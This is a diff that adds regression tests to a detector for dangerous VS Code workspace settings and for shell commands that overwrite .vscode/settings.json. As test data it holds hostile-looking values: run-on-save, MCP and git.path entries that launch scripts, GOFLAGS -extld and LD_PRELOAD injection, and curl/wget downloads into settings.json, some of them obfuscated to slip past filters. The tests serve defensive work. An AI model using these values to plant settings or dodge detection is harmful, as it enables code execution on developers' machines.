@@ -674,3 +674,64 @@ def test_qa3_devcontainer_stock_template():
     assert _hit(_write(".devcontainer/devcontainer.json", d)) is None
     # outside a devcontainer, /usr/local/bin still asks (documented)
     assert _rule(_write(S, {"python.defaultInterpreterPath": "/usr/local/bin/python"}))[0] == RULE
+
+
+# ---- QA round 4 regressions ----------------------------------------------------------
+@pytest.mark.parametrize("settings", [
+    {"emeraldwalk.runonsave": {"commands": [{"match": ".*", "cmd":
+        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -f .\\tool.ps1"}]}},
+    {"runOnSave.commands": [{"command": "C:\\Program Files\\Git\\bin\\bash.exe -c ./tool"}]},
+    {"latex-workshop.latex.tools": [{"command": "C:\\Program Files\\Git\\bin\\bash.exe -c ./tool"}]},
+    {"mcp": {"servers": {"x": {"command": "C:\\Program Files\\nodejs\\node.exe .\\tool.js"}}}},
+    {"mcp": {"servers": {"x": {"command": "C:/Program Files/nodejs/node.exe ./tool.js"}}}},
+    {"mcp": {"servers": {"x": {"command": "node", "args": ["./tool.js"]}}}},
+    {"git.path": "C:\\Windows\\System32\\cmd.exe/c.\\tool.bat"},
+    {"go.toolsEnvVars": {"GOFLAGS": "-ldflags=-extld=./tool"}},
+    {"go.toolsEnvVars": {"GOFLAGS": "-linkmode=external -extld=./tool"}},
+])
+def test_qa4_dangerous(settings):
+    assert _rule(_write(S, settings)) == (RULE, Action.ASK)
+
+
+def test_qa4_devcontainer_image_filter_not_for_env():
+    d = {"customizations": {"vscode": {"settings": {
+        "terminal.integrated.env.linux": {"LD_PRELOAD": "/usr/local/bin/x.so"}}}}}
+    assert _rule(_write(".devcontainer/devcontainer.json", d)) == (RULE, Action.ASK)
+
+
+@pytest.mark.parametrize("cmd", [
+    "curl https://example.com/s.json > /tmp/s.json; mv /tmp/s.json .vscode/settings.json",
+    "base64 -d payload.b64 > /tmp/s.json; cp /tmp/s.json .vscode/settings.json",
+    "wget -qO- https://x.example > s.tmp\nmv s.tmp .vscode/settings.json",
+    "curl https://x.example >/tmp/s.json && install -m644 /tmp/s.json .vscode/settings.json",
+    "tar -xf x.tar -C /tmp/x && cp /tmp/x/settings.json .vscode/settings.json",
+    "curl https://x.example | tee /dev/null .vscode/settings.json",
+    "curl https://x.example >| .vscode/settings.json",
+    'cu""rl https://x.example > .vscode/settings.json',
+    "git checkout evil -- \\\n.vscode/settings.json",
+])
+def test_qa4_opaque_staged_and_obfuscated(cmd):
+    assert _rule(_shell(cmd))[1] in (Action.ASK, Action.DENY)
+
+
+def test_qa4_git_show_head_restore_benign():
+    assert _hit(_shell("git show HEAD:.vscode/settings.json > .vscode/settings.json")) is None
+
+
+def test_qa4_perf_paths():
+    import time
+    for cmd in ("cat " + "<<a " * 65536 + " > .vscode/settings.json",
+                "echo '" + "x" * (8 << 20) + "' > notes.txt",
+                "echo '{\"s\": \"" + '\\"git.path\\": [1,' * 120000 + "\"}' > .vscode/settings.json"):
+        t = time.monotonic()
+        _hit(_shell(cmd))
+        assert time.monotonic() - t < 3.0, cmd[:40]
+
+
+@pytest.mark.parametrize("cmd", [
+    "c\\url https://example.com/s.json > .vscode/settings.json",
+    "curl https://example.com/s.json >.vscode/settings.json",
+    "curl https://example.com/s.json>.vscode/settings.json",
+])
+def test_qa4_opaque_spacing_and_backslash(cmd):
+    assert _rule(_shell(cmd))[1] in (Action.ASK, Action.DENY)
